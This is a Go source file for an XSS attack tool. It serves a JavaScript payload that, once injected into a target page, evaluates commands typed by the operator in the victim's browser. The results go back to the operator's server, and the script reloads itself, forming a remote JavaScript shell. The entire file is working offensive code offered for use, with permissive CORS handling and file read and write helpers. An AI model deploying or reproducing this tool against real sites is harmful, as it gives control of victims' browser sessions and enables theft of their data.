package main

import (
	"bufio"
	"crypto/rand"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"strings"
)

var usagePrefix = fmt.Sprintf(`Runs a REPL against an XSS target

Usage: %s [OPTIONS]

OPTIONS:
`, os.Args[0])

var (
	addrFlag = flag.String("addr", defaultAddr(), "Address to listen")
	pathFlag = flag.String("path", defaultPath(), "Path to serve")
)

// Gets the default address, can be overriden with flags.
func defaultAddr() string {
	// Connect to anything, this case Google DNS, to get our IP
	conn, err := net.Dial("udp", "8.8.8.8:80")
	if err != nil {
		log.Panic(err)
	}
	defer conn.Close()

	// Listen on port 0 to get a free port
	listener, err := net.Listen("tcp", ":0")
	if err != nil {
		log.Panic(err)
	}
	defer listener.Close()

	// Return IP plus port
	return fmt.Sprintf("%s:%d", conn.LocalAddr().(*net.UDPAddr).IP, listener.Addr().(*net.TCPAddr).Port)
}

// The default URL path is 32 random characters, to act as a password so no one can interfere with
// the REPL.
func defaultPath() string {
	b := make([]byte, 16)
	rand.Read(b)
	return fmt.Sprintf("/%x/", b)
}

// This is the js that is executed target side. It does a try/catch so that errors are sent back to
// the REPL too.
func jsInSprintf(jsIn string) string {
	jsonIn, _ := json.Marshal(jsIn)
	return fmt.Sprintf(`
var data = '';
var err = '';
try {
    data = JSON.stringify(eval(%s));
} catch(e) {
    err = e.stack.toString();
} finally {
    var formData = new FormData();
    formData.append('data', data);
    formData.append('err', err);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://%s%s');
    xhr.send(formData);
    document.body.appendChild(document.createElement('script')).src='http://%s%s';
}`, jsonIn, *addrFlag, *pathFlag, *addrFlag, *pathFlag)
}

func main() {
	// Flag setup
	flag.Usage = func() {
		fmt.Fprint(os.Stderr, usagePrefix)
		flag.PrintDefaults()
	}
	flag.Parse()

	// Start the server which listens for the target to connect
	jsIn := make(chan string, 1)
	jsOut := make(chan string, 1)
	jsErr := make(chan string, 1)
	go func() {
		http.HandleFunc(*pathFlag, func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Access-Control-Allow-Origin", r.Header.Get("Origin"))
			switch r.Method {
			case "OPTIONS":
				// Allow any CORS
				w.Header().Set("Access-Control-Allow-Methods", r.Header.Get("Access-Control-Request-Method"))
				w.Header().Set("Access-Control-Allow-Headers", r.Header.Get("Access-Control-Request-Headers"))
				return
			case "GET":
				r.Header.Set("Content-Type", "text/javascript")
				io.WriteString(w, jsInSprintf(<-jsIn))
			case "POST":
				jsOut <- r.FormValue("data")
				jsErr <- r.FormValue("err")
			default:
				http.Error(w, http.StatusText(http.StatusMethodNotAllowed), http.StatusMethodNotAllowed)
				return
			}
		})
		if err := http.ListenAndServe(*addrFlag, nil); err != nil {
			log.Panic(err)
		}
	}()
	fmt.Printf(`Waiting for target to connect: <script src="http://%s%s"></script>%s`, *addrFlag, *pathFlag, "\n")
	jsIn <- "'target connected'" // First command target will run is to ack they're connected

	// Run a REPL that feeds each line to the target
	prevOut := ""
	for {
		if out, err := <-jsOut, <-jsErr; err == "" {
			fmt.Println(out)
			prevOut = out
		} else {
			fmt.Fprintf(os.Stderr, "%s\n", err)
		}
		for {
			reader := bufio.NewReader(os.Stdin)
			fmt.Print("> ") // The prompt
			js, _ := reader.ReadString('\n')
			// Files are supported because typing everything by hand is tedious
			const readFilePrefix = "file://"
			const writeFilePrefix = "> file://"
			if strings.HasPrefix(js, readFilePrefix) {
				jsBytes, err := ioutil.ReadFile(strings.TrimSpace(strings.TrimPrefix(js, readFilePrefix)))
				if err != nil {
					fmt.Fprintf(os.Stderr, "%v\n", err)
					continue
				}
				jsIn <- string(jsBytes)
			} else if strings.HasPrefix(js, writeFilePrefix) {
				if err := ioutil.WriteFile(strings.TrimSpace(strings.TrimPrefix(js, writeFilePrefix)), []byte(prevOut), 0x600); err != nil {
					fmt.Fprintf(os.Stderr, "%v\n", err)
				}
				continue
			} else {
				jsIn <- js
			}
			break
		}
	}
}
